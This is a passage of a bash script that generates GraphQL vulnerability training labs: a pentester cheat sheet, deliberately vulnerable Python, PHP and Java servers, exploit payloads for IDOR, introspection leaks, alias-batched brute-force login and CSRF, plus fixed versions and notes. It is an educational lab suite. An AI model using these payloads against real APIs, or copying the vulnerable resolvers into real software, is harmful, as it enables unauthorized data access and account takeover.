#!/usr/bin/env bash
# =============================================================================
#  build_graphql.sh  —  GraphQL API Vulnerability Labs
#  Author  : Pro Pentester / AppSec Engineer
#  Mirrors : SSRF lab layout (exploit / fix / notes / vuln / README)
#  Labs    :
#    1. graphql-private-posts          (APPRENTICE)
#    2. graphql-accidental-field-exposure (PRACTITIONER)
#    3. graphql-hidden-endpoint        (PRACTITIONER)
#    4. graphql-brute-force-bypass     (PRACTITIONER)
#    5. graphql-csrf                   (PRACTITIONER)
# =============================================================================

set -euo pipefail

ROOT="graphql-labs"
mkdir -p "$ROOT"

# ─── helper ──────────────────────────────────────────────────────────────────
mf() { mkdir -p "$(dirname "$1")"; cat > "$1"; }   # make file with heredoc

# =============================================================================
#  ROOT README
# =============================================================================
mf "$ROOT/README.md" << 'EOF'
# GraphQL API Vulnerability Labs

A professional security-research lab suite covering five real-world GraphQL
attack classes. Each lab mirrors the layout used in the SSRF suite:

```
<lab>/
├── exploit/   payloads · raw request · raw response
├── fix/       hardened Java · PHP · Python implementations
├── notes/     explanation · methodology
├── vuln/      vulnerable Java · PHP · Python implementations
└── README.md
```

## Labs

| # | Folder | Level | Topic |
|---|--------|-------|-------|
| 1 | graphql-private-posts | APPRENTICE | IDOR via unauthenticated query |
| 2 | graphql-accidental-field-exposure | PRACTITIONER | Introspection leaks hidden fields |
| 3 | graphql-hidden-endpoint | PRACTITIONER | Endpoint discovery & introspection |
| 4 | graphql-brute-force-bypass | PRACTITIONER | Alias-batching to bypass rate-limit |
| 5 | graphql-csrf | PRACTITIONER | CSRF over GET / content-type switch |

## Quick-start

```bash
chmod +x build_graphql.sh && ./build_graphql.sh
```

## References
- https://portswigger.net/web-security/graphql
- https://graphql.org/learn/introspection/
- https://owasp.org/www-project-web-security-testing-guide/
EOF

# =============================================================================
#  CHEAT SHEET (root)
# =============================================================================
mf "$ROOT/GRAPHQL — PROFESSIONAL PENTESTER CHEAT SHEET" << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════╗
║          GRAPHQL API — PROFESSIONAL PENTESTER CHEAT SHEET                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

━━━ 1. DISCOVERY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Common endpoints: /graphql /api/graphql /v1/graphql /graphiql /graphql/console
Method probe:  GET  POST(JSON)  POST(x-www-form-urlencoded)
Universal query:   {"query":"{__typename}"}

━━━ 2. INTROSPECTION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Full schema dump:
  {"query":"{ __schema { queryType{name} types{ name fields{ name args{name type{name kind ofType{name}}} } } } }"}

Field-level dump on a type:
  {"query":"{ __type(name:\"User\"){ fields{ name type{ name } } } }"}

━━━ 3. IDOR / PRIVATE DATA ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Enumerate numeric IDs: getBlogPost(id:1..N)
- Try fields returned by introspection that aren't in UI: postPassword, secretNote
- Unauthenticated session: strip auth cookie/header completely

━━━ 4. BRUTE-FORCE / RATE-LIMIT BYPASS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Alias batching — multiple operations in ONE HTTP request:
  { a1:login(user:"admin",pass:"pass1") a2:login(user:"admin",pass:"pass2") … }
Each alias counts as 1 HTTP request but server-side rate-limit sees 1 request.

━━━ 5. CSRF ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Vectors:
  a) Mutation via GET parameter:  /graphql?query=mutation{deleteUser(id:42)}
  b) POST with text/plain body crafted as form submission
  c) POST with application/x-www-form-urlencoded (if server accepts)
Precondition: no CSRF token AND cookies sent cross-origin (SameSite=None/Lax)

━━━ 6. OPEN REDIRECT CHAIN ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
If a mutation returns a URL that the client follows → chain to SSRF / phishing

━━━ 7. TOOLS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- InQL (Burp extension)
- GraphQL Voyager
- clairvoyance (wordlist-based field enumeration when introspection disabled)
- graphql-cop (security audit)
EOF

# =============================================================================
# ███████╗  LAB 1  —  PRIVATE POSTS (APPRENTICE)
# =============================================================================
L="$ROOT/graphql-private-posts"

# ── vuln ──────────────────────────────────────────────────────────────────────
mf "$L/vuln/vuln.py" << 'EOF'
"""
VULNERABLE: GraphQL resolver — no authorization on getBlogPost.
The resolver fetches ANY post by ID regardless of isPublic flag.
"""
from flask import Flask, request, jsonify
from graphql import build_schema, graphql_sync

app = Flask(__name__)

POSTS = {
    1: {"id": 1, "title": "Welcome", "content": "Hello world", "isPublic": True},
    2: {"id": 2, "title": "Secret Draft", "content": "Top secret content here",
        "postPassword": "peter:Th3SecretPass!", "isPublic": False},
}

schema = build_schema("""
    type Query {
        getBlogPost(id: Int!): BlogPost
        getAllPosts: [BlogPost]
    }
    type BlogPost {
        id: Int
        title: String
        content: String
        postPassword: String   # ← sensitive field returned to anyone
        isPublic: Boolean
    }
""")

def resolve_get_blog_post(root, info, id):
    # VULN: no auth check, no isPublic filter
    return POSTS.get(id)

def resolve_get_all_posts(root, info):
    # VULN: returns ALL posts including private ones
    return list(POSTS.values())

root_value = {
    "getBlogPost": resolve_get_blog_post,
    "getAllPosts": resolve_get_all_posts,
}

@app.route("/graphql", methods=["GET", "POST"])
def graphql_endpoint():
    data = request.get_json()
    result = graphql_sync(schema, data["query"], root_value=root_value,
                          variable_values=data.get("variables"))
    return jsonify(result.data)

if __name__ == "__main__":
    app.run(debug=True)
EOF

mf "$L/vuln/vuln.php" << 'EOF'
<?php
/**
 * VULNERABLE: GraphQL endpoint using webonyx/graphql-php
 * No auth check — private posts accessible by ID enumeration.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\ObjectType;
use GraphQL\Type\Definition\Type;

$posts = [
    1 => ['id'=>1,'title'=>'Welcome','content'=>'Hello world','postPassword'=>null,'isPublic'=>true],
    2 => ['id'=>2,'title'=>'Secret Draft','content'=>'Top secret','postPassword'=>'peter:Th3SecretPass!','isPublic'=>false],
];

$blogPostType = new ObjectType([
    'name' => 'BlogPost',
    'fields' => [
        'id'           => ['type' => Type::int()],
        'title'        => ['type' => Type::string()],
        'content'      => ['type' => Type::string()],
        'postPassword' => ['type' => Type::string()],  // VULN: exposed
        'isPublic'     => ['type' => Type::boolean()],
    ],
]);

$queryType = new ObjectType([
    'name' => 'Query',
    'fields' => [
        'getBlogPost' => [
            'type' => $blogPostType,
            'args' => ['id' => ['type' => Type::nonNull(Type::int())]],
            // VULN: no auth, no isPublic check
            'resolve' => fn($root, $args) => $posts[$args['id']] ?? null,
        ],
    ],
]);

$schema = new Schema(['query' => $queryType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query']);
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/vuln/vuln.java" << 'EOF'
// VULNERABLE: Spring Boot + GraphQL — no authorization on getBlogPost resolver
package com.lab.graphql;

import org.springframework.graphql.data.method.annotation.Argument;
import org.springframework.graphql.data.method.annotation.QueryMapping;
import org.springframework.stereotype.Controller;
import java.util.*;

record BlogPost(int id, String title, String content, String postPassword, boolean isPublic) {}

@Controller
public class BlogController {

    private static final Map<Integer, BlogPost> POSTS = Map.of(
        1, new BlogPost(1, "Welcome", "Hello world", null, true),
        2, new BlogPost(2, "Secret Draft", "Top secret content", "peter:Th3SecretPass!", false)
    );

    @QueryMapping
    // VULN: no @PreAuthorize, no isPublic filter
    public BlogPost getBlogPost(@Argument int id) {
        return POSTS.get(id);
    }

    @QueryMapping
    // VULN: returns all posts including private
    public List<BlogPost> getAllPosts() {
        return new ArrayList<>(POSTS.values());
    }
}
EOF

# ── exploit ───────────────────────────────────────────────────────────────────
mf "$L/exploit/payloads.txt" << 'EOF'
# ── LAB 1: Accessing Private GraphQL Posts ───────────────────────────────────

# Step 1 — enumerate posts via getAllPosts (leak isPublic=false entries)
{"query":"{ getAllPosts { id title isPublic } }"}

# Step 2 — fetch private post directly by known/guessed ID
{"query":"{ getBlogPost(id: 2) { id title content postPassword isPublic } }"}

# Step 3 — brute-force IDs 1-10
{"query":"{ getBlogPost(id: 1) { id title postPassword } }"}
{"query":"{ getBlogPost(id: 2) { id title postPassword } }"}
{"query":"{ getBlogPost(id: 3) { id title postPassword } }"}

# Step 4 — use alias batching to enumerate in one request
{
  "query": "{ p1:getBlogPost(id:1){postPassword} p2:getBlogPost(id:2){postPassword} p3:getBlogPost(id:3){postPassword} }"
}
EOF

mf "$L/exploit/request.txt" << 'EOF'
POST /graphql HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/json
Cookie: session=<your-session-cookie>

{"query":"{ getBlogPost(id: 2) { id title content postPassword isPublic } }"}
EOF

mf "$L/exploit/response.txt" << 'EOF'
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "getBlogPost": {
      "id": 2,
      "title": "Secret Draft",
      "content": "Top secret content here",
      "postPassword": "peter:Th3SecretPass!",
      "isPublic": false
    }
  }
}
EOF

# ── fix ───────────────────────────────────────────────────────────────────────
mf "$L/fix/fix.py" << 'EOF'
"""
FIX: Authorization check + field-level protection on getBlogPost.
1. Resolver checks isPublic flag before returning.
2. postPassword field only resolved for authenticated admins.
3. getAllPosts filters to public-only for unauthenticated callers.
"""
from flask import Flask, request, jsonify, g
from graphql import build_schema, graphql_sync
from functools import wraps

app = Flask(__name__)

POSTS = {
    1: {"id":1,"title":"Welcome","content":"Hello world","postPassword":None,"isPublic":True},
    2: {"id":2,"title":"Secret Draft","content":"Top secret","postPassword":"peter:Th3SecretPass!","isPublic":False},
}

schema = build_schema("""
    type Query {
        getBlogPost(id: Int!): BlogPost
        getAllPosts: [BlogPost]
    }
    type BlogPost {
        id: Int
        title: String
        content: String
        postPassword: String
        isPublic: Boolean
    }
""")

def get_current_user(req):
    token = req.headers.get("Authorization", "")
    return {"role": "admin"} if token == "Bearer admin-token" else None

def resolve_get_blog_post(root, info, id):
    post = POSTS.get(id)
    if not post:
        return None
    user = get_current_user(info.context["request"])
    # FIX: only return private posts to admins
    if not post["isPublic"] and (not user or user["role"] != "admin"):
        return None
    # FIX: strip postPassword unless admin
    if not user or user["role"] != "admin":
        return {**post, "postPassword": None}
    return post

def resolve_get_all_posts(root, info):
    user = get_current_user(info.context["request"])
    posts = list(POSTS.values())
    if not user or user["role"] != "admin":
        posts = [p for p in posts if p["isPublic"]]
    return [{**p, "postPassword": None} if (not user or user["role"]!="admin") else p
            for p in posts]

root_value = {
    "getBlogPost": resolve_get_blog_post,
    "getAllPosts": resolve_get_all_posts,
}

@app.route("/graphql", methods=["POST"])
def graphql_endpoint():
    data = request.get_json()
    result = graphql_sync(schema, data["query"], root_value=root_value,
                          variable_values=data.get("variables"),
                          context_value={"request": request})
    return jsonify(result.data)

if __name__ == "__main__":
    app.run()
EOF

mf "$L/fix/fix.php" << 'EOF'
<?php
/**
 * FIX: Authorization-aware resolver.
 * - Private posts returned only to authenticated admins.
 * - postPassword masked for non-admins.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\ObjectType;
use GraphQL\Type\Definition\Type;
use GraphQL\Type\Definition\ResolveInfo;

$posts = [
    1 => ['id'=>1,'title'=>'Welcome','content'=>'Hello','postPassword'=>null,'isPublic'=>true],
    2 => ['id'=>2,'title'=>'Secret','content'=>'Top secret','postPassword'=>'peter:Th3SecretPass!','isPublic'=>false],
];

function getCurrentUser(): ?array {
    $auth = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
    return $auth === 'Bearer admin-token' ? ['role'=>'admin'] : null;
}

$blogPostType = new ObjectType([
    'name'   => 'BlogPost',
    'fields' => [
        'id'      => ['type' => Type::int()],
        'title'   => ['type' => Type::string()],
        'content' => ['type' => Type::string()],
        // FIX: field-level resolver hides password from non-admins
        'postPassword' => [
            'type'    => Type::string(),
            'resolve' => function($post) {
                $user = getCurrentUser();
                return ($user && $user['role'] === 'admin') ? $post['postPassword'] : null;
            }
        ],
        'isPublic' => ['type' => Type::boolean()],
    ],
]);

$queryType = new ObjectType([
    'name' => 'Query',
    'fields' => [
        'getBlogPost' => [
            'type' => $blogPostType,
            'args' => ['id' => ['type' => Type::nonNull(Type::int())]],
            'resolve' => function($root, $args) use ($posts) {
                $post = $posts[$args['id']] ?? null;
                if (!$post) return null;
                $user = getCurrentUser();
                // FIX: block private post access for unauthenticated users
                if (!$post['isPublic'] && (!$user || $user['role'] !== 'admin')) {
                    return null;
                }
                return $post;
            }
        ],
    ],
]);

$schema = new Schema(['query' => $queryType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query']);
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/fix/fix.java" << 'EOF'
// FIX: Spring Boot + Spring Security — role-based access on GraphQL resolvers
package com.lab.graphql;

import org.springframework.graphql.data.method.annotation.*;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import java.util.*;

record BlogPost(int id, String title, String content, String postPassword, boolean isPublic) {
    BlogPost withoutPassword() { return new BlogPost(id, title, content, null, isPublic); }
}

@Controller
public class BlogController {

    private static final Map<Integer, BlogPost> POSTS = Map.of(
        1, new BlogPost(1, "Welcome", "Hello world", null, true),
        2, new BlogPost(2, "Secret Draft", "Top secret", "peter:Th3SecretPass!", false)
    );

    @QueryMapping
    public BlogPost getBlogPost(@Argument int id) {
        var post = POSTS.get(id);
        if (post == null) return null;
        var auth = SecurityContextHolder.getContext().getAuthentication();
        boolean isAdmin = auth != null && auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
        // FIX: non-admin cannot see private posts
        if (!post.isPublic() && !isAdmin) return null;
        // FIX: strip postPassword unless admin
        return isAdmin ? post : post.withoutPassword();
    }

    @QueryMapping
    public List<BlogPost> getAllPosts() {
        var auth = SecurityContextHolder.getContext().getAuthentication();
        boolean isAdmin = auth != null && auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
        return POSTS.values().stream()
            .filter(p -> isAdmin || p.isPublic())
            .map(p -> isAdmin ? p : p.withoutPassword())
            .toList();
    }
}
EOF

# ── notes ─────────────────────────────────────────────────────────────────────
mf "$L/notes/explanation.txt" << 'EOF'
LAB 1 — Accessing Private GraphQL Posts
========================================

VULNERABILITY CLASS : IDOR + Missing Authorization (OWASP API3:2023)
CVSS ESTIMATE       : 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

ROOT CAUSE
----------
The GraphQL resolver accepts an integer `id` argument and returns the
corresponding BlogPost object with NO authorization check. Private posts
(isPublic=false) and sensitive fields (postPassword) are returned to any
caller — authenticated or not.

Additionally, the schema exposes `postPassword` as a top-level field,
meaning introspection alone reveals its existence.

IMPACT
------
- Full read access to all private blog posts.
- Credential leakage via postPassword field (blog owner credentials).
- Potential account takeover if credentials are reused.

REMEDIATION SUMMARY
-------------------
1. Resolver-level auth : check isPublic before returning; restrict private
   posts to ROLE_ADMIN.
2. Field-level masking : postPassword resolver returns null for non-admins.
3. Schema design       : consider removing postPassword from the public
   schema entirely; serve it through a separate authenticated endpoint.
4. Disable introspection in production (or use persisted queries).
EOF

mf "$L/notes/methodology.txt" << 'EOF'
LAB 1 — Methodology
====================

STEP 1 — RECONNAISSANCE
  • Identify the GraphQL endpoint (/graphql, /api/graphql, etc.)
  • Send {"query":"{__typename}"} — a 200 response confirms GraphQL.

STEP 2 — INTROSPECTION
  • Run full introspection query (see cheat sheet).
  • Look for: fields not visible in the UI, sensitive field names
    (password, secret, token, key, internal, private, draft).

STEP 3 — ENUMERATE OBJECTS
  • Use getAllPosts (or similar list query) to discover IDs.
  • Note which IDs are marked isPublic=false.

STEP 4 — DIRECT OBJECT ACCESS
  • Query getBlogPost(id: <private_id>) requesting ALL fields including
    postPassword.
  • If auth not enforced, data is returned in clear text.

STEP 5 — ALIAS BATCHING (efficiency)
  • Combine multiple ID lookups into one request using aliases:
    { p1:getBlogPost(id:1){postPassword} p2:getBlogPost(id:2){postPassword} }

STEP 6 — DOCUMENT & REPORT
  • Record raw request/response.
  • Map to OWASP API3 (Broken Object Level Authorization).
  • Provide remediation recommendations.

TOOLS USED
  • Burp Suite (Repeater + InQL extension)
  • curl / httpie
EOF

mf "$L/README.md" << 'EOF'
# Lab 1 — Accessing Private GraphQL Posts (APPRENTICE)

## Vulnerability
IDOR via unauthenticated GraphQL query — private posts and credential fields
returned to any caller due to missing authorization checks.

## Files
| Path | Description |
|------|-------------|
| `vuln/vuln.py` | Vulnerable Flask/Graphql-core server |
| `vuln/vuln.php` | Vulnerable webonyx/graphql-php server |
| `vuln/vuln.java` | Vulnerable Spring Boot + GraphQL server |
| `exploit/payloads.txt` | GraphQL queries for exploitation |
| `exploit/request.txt` | Raw HTTP request |
| `exploit/response.txt` | Raw HTTP response (data leak) |
| `fix/fix.py` | Patched Python resolver |
| `fix/fix.php` | Patched PHP resolver |
| `fix/fix.java` | Patched Java resolver (Spring Security) |
| `notes/explanation.txt` | Vulnerability deep-dive |
| `notes/methodology.txt` | Step-by-step pentesting methodology |

## Quick Exploit
```graphql
{ getBlogPost(id: 2) { id title content postPassword isPublic } }
```
EOF


# =============================================================================
# ███████╗  LAB 2  —  ACCIDENTAL FIELD EXPOSURE (PRACTITIONER)
# =============================================================================
L="$ROOT/graphql-accidental-field-exposure"

mf "$L/vuln/vuln.py" << 'EOF'
"""
VULNERABLE: User type exposes password and role via introspection.
Attacker discovers hidden fields through __type query and reads them directly.
"""
from flask import Flask, request, jsonify
from graphql import build_schema, graphql_sync

app = Flask(__name__)

USERS = {
    1: {"id":1,"username":"admin","email":"admin@corp.com","password":"supersecret123","role":"ADMIN"},
    2: {"id":2,"username":"carlos","email":"carlos@corp.com","password":"hunter2","role":"USER"},
}

# VULN: password and role fields are part of the schema — introspection exposes them
schema = build_schema("""
    type Query {
        getUser(id: Int!): User
        getCurrentUser: User
    }
    type User {
        id: Int
        username: String
        email: String
        password: String   # VULN: should NEVER be in schema
        role: String       # VULN: sensitive — exposes privilege level
    }
""")

def resolve_get_user(root, info, id):
    return USERS.get(id)   # VULN: no auth, returns everything

def resolve_get_current_user(root, info):
    return USERS.get(1)    # Simulated: always returns admin for demo

root_value = {
    "getUser": resolve_get_user,
    "getCurrentUser": resolve_get_current_user,
}

@app.route("/graphql", methods=["POST"])
def graphql_endpoint():
    data = request.get_json()
    result = graphql_sync(schema, data["query"], root_value=root_value)
    return jsonify(result.data)

if __name__ == "__main__":
    app.run(debug=True)
EOF

mf "$L/vuln/vuln.php" << 'EOF'
<?php
/**
 * VULNERABLE: password and role fields in GraphQL schema.
 * Introspection reveals them; resolvers return raw DB row.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\ObjectType;
use GraphQL\Type\Definition\Type;

$users = [
    1 => ['id'=>1,'username'=>'admin','email'=>'admin@corp.com','password'=>'supersecret123','role'=>'ADMIN'],
    2 => ['id'=>2,'username'=>'carlos','email'=>'carlos@corp.com','password'=>'hunter2','role'=>'USER'],
];

$userType = new ObjectType([
    'name' => 'User',
    'fields' => [
        'id'       => ['type' => Type::int()],
        'username' => ['type' => Type::string()],
        'email'    => ['type' => Type::string()],
        'password' => ['type' => Type::string()],  // VULN
        'role'     => ['type' => Type::string()],  // VULN
    ],
]);

$queryType = new ObjectType([
    'name' => 'Query',
    'fields' => [
        'getUser' => [
            'type' => $userType,
            'args' => ['id' => ['type' => Type::nonNull(Type::int())]],
            'resolve' => fn($r,$args) => $users[$args['id']] ?? null,
        ],
    ],
]);

$schema = new Schema(['query' => $queryType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query']);
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/vuln/vuln.java" << 'EOF'
// VULNERABLE: User entity exposes password and role without field-level access control
package com.lab.graphql;

import org.springframework.graphql.data.method.annotation.*;
import org.springframework.stereotype.Controller;
import java.util.*;

// VULN: JPA entity mapped directly to GraphQL type — password hash leaks
record User(int id, String username, String email, String password, String role) {}

@Controller
public class UserController {

    private static final Map<Integer, User> USERS = Map.of(
        1, new User(1, "admin", "admin@corp.com", "supersecret123", "ADMIN"),
        2, new User(2, "carlos", "carlos@corp.com", "hunter2", "USER")
    );

    @QueryMapping
    // VULN: resolves full User including password
    public User getUser(@Argument int id) {
        return USERS.get(id);
    }
}
EOF

mf "$L/exploit/payloads.txt" << 'EOF'
# ── LAB 2: Accidental Exposure of Private GraphQL Fields ─────────────────────

# Step 1 — introspect User type to find hidden fields
{
  "query": "{ __type(name: \"User\") { fields { name type { name kind } } } }"
}

# Step 2 — query the discovered sensitive fields
{
  "query": "{ getUser(id: 1) { id username email password role } }"
}

# Step 3 — enumerate all users
{
  "query": "{ u1:getUser(id:1){username password role} u2:getUser(id:2){username password role} }"
}

# Step 4 — full schema dump to find ALL hidden types/fields
{
  "query": "{ __schema { types { name fields { name args { name } } } } }"
}
EOF

mf "$L/exploit/request.txt" << 'EOF'
POST /graphql HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/json

{"query":"{ __type(name: \"User\") { fields { name type { name kind } } } }"}

--- Response reveals: password, role fields ---

POST /graphql HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/json

{"query":"{ getUser(id: 1) { username password role } }"}
EOF

mf "$L/exploit/response.txt" << 'EOF'
# Introspection response
{
  "data": {
    "__type": {
      "fields": [
        {"name":"id","type":{"name":"Int","kind":"SCALAR"}},
        {"name":"username","type":{"name":"String","kind":"SCALAR"}},
        {"name":"email","type":{"name":"String","kind":"SCALAR"}},
        {"name":"password","type":{"name":"String","kind":"SCALAR"}},
        {"name":"role","type":{"name":"String","kind":"SCALAR"}}
      ]
    }
  }
}

# Direct query response
{
  "data": {
    "getUser": {
      "username": "admin",
      "password": "supersecret123",
      "role": "ADMIN"
    }
  }
}
EOF

mf "$L/fix/fix.py" << 'EOF'
"""
FIX: Remove sensitive fields from schema; use separate DTO/response type.
1. Password never included in GraphQL schema.
2. Role only returned to ADMIN callers.
3. Introspection disabled in production.
"""
from flask import Flask, request, jsonify
from graphql import build_schema, graphql_sync

app = Flask(__name__)

USERS = {
    1: {"id":1,"username":"admin","email":"admin@corp.com","_password":"supersecret123","_role":"ADMIN"},
    2: {"id":2,"username":"carlos","email":"carlos@corp.com","_password":"hunter2","_role":"USER"},
}

# FIX: password REMOVED from schema. role gated behind resolver logic.
schema = build_schema("""
    type Query {
        getUser(id: Int!): UserPublic
        getCurrentUser: UserSelf
    }
    type UserPublic {
        id: Int
        username: String
    }
    type UserSelf {
        id: Int
        username: String
        email: String
    }
""")

def get_current_user(req):
    token = req.headers.get("Authorization","")
    return {"id":1,"_role":"ADMIN"} if token == "Bearer admin-token" else None

def resolve_get_user(root, info, id):
    u = USERS.get(id)
    if not u: return None
    # FIX: only expose safe public fields
    return {"id": u["id"], "username": u["username"]}

def resolve_get_current_user(root, info):
    caller = get_current_user(info.context["request"])
    if not caller: return None
    u = USERS.get(caller["id"])
    # FIX: email only to the user themselves
    return {"id": u["id"], "username": u["username"], "email": u["email"]}

root_value = {
    "getUser": resolve_get_user,
    "getCurrentUser": resolve_get_current_user,
}

@app.route("/graphql", methods=["POST"])
def graphql_endpoint():
    data = request.get_json()
    # FIX: disable introspection in non-debug mode
    if "__schema" in data.get("query","") or "__type" in data.get("query",""):
        return jsonify({"errors":[{"message":"Introspection disabled"}]}), 403
    result = graphql_sync(schema, data["query"], root_value=root_value,
                          context_value={"request": request})
    return jsonify(result.data)

if __name__ == "__main__":
    app.run()
EOF

mf "$L/fix/fix.php" << 'EOF'
<?php
/**
 * FIX:
 * 1. Separate public UserPublic DTO — password/role NOT in schema.
 * 2. Introspection blocked via middleware check.
 * 3. Resolver returns only safe fields.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\ObjectType;
use GraphQL\Type\Definition\Type;

$users = [
    1 => ['id'=>1,'username'=>'admin','email'=>'admin@corp.com','_password'=>'hash','_role'=>'ADMIN'],
    2 => ['id'=>2,'username'=>'carlos','email'=>'carlos@corp.com','_password'=>'hash','_role'=>'USER'],
];

// FIX: public-safe type — no password, no role
$userPublicType = new ObjectType([
    'name' => 'UserPublic',
    'fields' => [
        'id'       => ['type' => Type::int()],
        'username' => ['type' => Type::string()],
    ],
]);

$queryType = new ObjectType([
    'name' => 'Query',
    'fields' => [
        'getUser' => [
            'type' => $userPublicType,
            'args' => ['id' => ['type' => Type::nonNull(Type::int())]],
            'resolve' => function($r, $args) use ($users) {
                $u = $users[$args['id']] ?? null;
                return $u ? ['id'=>$u['id'],'username'=>$u['username']] : null;
            }
        ],
    ],
]);

$schema = new Schema(['query' => $queryType]);
$input  = json_decode(file_get_contents('php://input'), true);

// FIX: block introspection
if (str_contains($input['query'] ?? '', '__schema') || str_contains($input['query'] ?? '', '__type')) {
    http_response_code(403);
    echo json_encode(['errors'=>[['message'=>'Introspection disabled']]]);
    exit;
}

$result = GraphQL::executeQuery($schema, $input['query']);
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/fix/fix.java" << 'EOF'
// FIX: Separate UserResponse DTO — password/role never exposed.
// Introspection disabled via Spring Boot config.
package com.lab.graphql;

import org.springframework.boot.autoconfigure.graphql.GraphQlProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.graphql.data.method.annotation.*;
import org.springframework.stereotype.Controller;
import java.util.*;

// FIX: Safe DTO — no password, no role
record UserPublicDTO(int id, String username) {}

@Controller
public class UserController {

    private static final Map<Integer, Map<String,Object>> USERS = Map.of(
        1, Map.of("id",1,"username","admin","email","admin@corp.com","_password","hash","_role","ADMIN"),
        2, Map.of("id",2,"username","carlos","email","carlos@corp.com","_password","hash","_role","USER")
    );

    @QueryMapping
    public UserPublicDTO getUser(@Argument int id) {
        var u = USERS.get(id);
        if (u == null) return null;
        // FIX: only return public-safe DTO
        return new UserPublicDTO((int)u.get("id"), (String)u.get("username"));
    }
}

// FIX: Disable introspection in application.properties:
// spring.graphql.schema.introspection.enabled=false
@Configuration
class GraphQLConfig {
    @Bean
    public GraphQlProperties.Schema.Introspection introspection() {
        var i = new GraphQlProperties.Schema.Introspection();
        i.setEnabled(false);  // production setting
        return i;
    }
}
EOF

mf "$L/notes/explanation.txt" << 'EOF'
LAB 2 — Accidental Exposure of Private GraphQL Fields
=======================================================

VULNERABILITY CLASS : Sensitive Data Exposure via Introspection (OWASP API3+API8)
CVSS ESTIMATE       : 8.2 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

ROOT CAUSE
----------
Developers mapped the internal database User entity directly to the GraphQL
type without creating a separate DTO (Data Transfer Object). As a result,
internal fields (password, role) were accidentally included in the schema.

GraphQL's introspection system allows any client to enumerate ALL types and
fields in the schema. An attacker only needs to:
  1. Run __type(name:"User") to discover the `password` field exists.
  2. Query getUser(id:1){password} to retrieve the plaintext credential.

IMPACT
------
- Plaintext password extraction for all users.
- Role enumeration → privilege escalation attacks.
- Account takeover via credential stuffing or direct login.

REMEDIATION
-----------
1. NEVER map DB entities directly to GraphQL types.
2. Create explicit DTOs for each concern (UserPublic, UserSelf, UserAdmin).
3. Disable introspection in production environments.
4. Use schema directives (@deprecated, custom @auth directives) to gate fields.
5. Implement field-level authorization via GraphQL middleware (e.g., graphql-shield).
EOF

mf "$L/notes/methodology.txt" << 'EOF'
LAB 2 — Methodology
====================

STEP 1 — ENUMERATE TYPES
  • Introspect the full schema or use targeted __type queries.
  • List all fields on sensitive types: User, Account, Admin, Payment.

STEP 2 — IDENTIFY SENSITIVE FIELDS
  • Look for: password, passwd, secret, token, apiKey, ssn, creditCard,
    internalNote, role, permissions, isAdmin, twoFactorSecret.

STEP 3 — QUERY SENSITIVE FIELDS
  • Even if UI doesn't expose them, the resolver may still return them.
  • Test both authenticated and unauthenticated sessions.

STEP 4 — CROSS-REFERENCE WITH UI
  • Compare schema fields vs. fields visible in the frontend — delta =
    potentially unintentionally exposed server-side data.

STEP 5 — ESCALATE
  • Use leaked credentials/tokens to authenticate as higher-privilege users.
  • Use leaked role info to craft privilege-escalation payloads.

TOOLS
  • InQL Burp Extension (auto-generates queries for all types)
  • GraphQL Voyager (visual schema exploration)
  • graphql-cop --target https://target/graphql
EOF

mf "$L/README.md" << 'EOF'
# Lab 2 — Accidental Exposure of Private GraphQL Fields (PRACTITIONER)

## Vulnerability
Internal DB entity mapped directly to GraphQL type → sensitive fields
(password, role) discoverable via introspection and directly queryable.

## Quick Exploit
```graphql
# 1. Discover fields
{ __type(name: "User") { fields { name } } }

# 2. Extract data
{ getUser(id: 1) { username password role } }
```
EOF


# =============================================================================
# ███████╗  LAB 3  —  HIDDEN ENDPOINT (PRACTITIONER)
# =============================================================================
L="$ROOT/graphql-hidden-endpoint"

mf "$L/vuln/vuln.py" << 'EOF'
"""
VULNERABLE: GraphQL endpoint mounted at non-standard path.
No auth on introspection. Universal query {__typename} confirms GraphQL.
"""
from flask import Flask, request, jsonify
from graphql import build_schema, graphql_sync

app = Flask(__name__)

schema = build_schema("""
    type Query {
        getUser(id: Int!): User
        listUsers: [User]
